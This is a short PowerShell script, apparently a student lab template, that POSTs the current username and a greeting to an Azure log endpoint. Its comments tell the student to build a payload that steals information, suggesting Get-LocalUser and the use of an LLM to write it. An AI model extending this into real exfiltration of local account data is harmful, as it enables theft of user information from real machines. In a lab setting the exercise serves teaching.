## This should be your Azure URL NOT mine
$serviceUrl = "student-lab-a5pi2dp2qebma.azurewebsites.net/log"


# This payload DOES NOT steal information
# Create one that does.

# Get-LocalUser is a fun one
# Use whatever LLM you want
$payload = @{
    student = $env:USERNAME
    message = "Hello from PowerShell!"
    lab     = "Azure POST test"
}

$response = Invoke-RestMethod -Uri $serviceUrl -Method POST -Body ($payload | ConvertTo-Json) -ContentType "application/json"

$response